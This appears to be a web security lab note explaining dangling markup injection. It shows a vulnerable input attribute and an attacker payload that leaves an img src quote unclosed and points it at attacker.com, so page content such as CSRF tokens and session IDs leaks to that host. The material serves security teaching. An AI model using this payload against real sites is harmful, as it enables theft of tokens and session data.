# Dangling Markup Injection

## Overview

Dangling Markup Injection is a technique used to capture sensitive data when traditional XSS is not possible.

Unlike XSS:

```text
Inject JavaScript
        ↓
Execute Code
```

Dangling Markup:

```text
Inject HTML
        ↓
Capture Sensitive Data
```

---

# Vulnerable Scenario

Application reflects input inside an attribute:

```html
<input
type="text"
name="email"
value="USER_INPUT">
```

---

# Attacker Input

```html
"><img src='//attacker.com?
```

---

# Why It Works

The attacker intentionally leaves:

```html
'
```

unclosed.

Browser keeps reading:

```text
Everything After Injection Point
```

until it finds another quote.

---

# Example Flow

```text
Victim Page
        ↓
Sensitive Data Appears Later
        ↓
Browser Appends Data To URL
        ↓
Attacker Receives Data
```

---

# Possible Data Leakage

```text
CSRF Tokens
Session Identifiers
Email Addresses
Financial Information
```

---

# Why It Matters

Even when:

```text
JavaScript Blocked
CSP Present
XSS Filtered
```

Dangling Markup may still succeed.

---

# Related Lab

- Lab29

---

# Key Takeaways

- Does not require JavaScript.
- Relies on browser parsing behavior.
- Useful when XSS is blocked.